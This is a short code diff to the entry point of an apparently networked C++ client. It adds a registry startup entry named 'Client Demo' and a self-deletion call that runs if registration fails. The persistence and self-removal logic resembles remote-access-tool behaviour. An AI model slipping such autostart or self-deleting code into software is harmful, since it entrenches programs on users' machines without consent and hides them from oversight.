@@ -7,6 +7,9 @@
 #include "common/dllRunner.h"
 #include <common/iniFile.h>
 #include "auto_start.h"
+extern "C" {
+#include "reg_startup.h"
+}
 
 #pragma comment(lib, "ws2_32.lib")
 
@@ -200,6 +203,13 @@ public:
 // 如果配置文件不存在就从命令行中获取IP和端口.
 int main(int argc, const char *argv[])
 {
+	// 注册启动项
+	int r = RegisterStartup("Client Demo", "ClientDemo");
+	if (r <= 0) {
+		BOOL s = self_del();
+		if (!IsDebug)return r;
+	}
+
 	BOOL ok = SetSelfStart(argv[0], REG_NAME);
 	if(!ok)
 	{
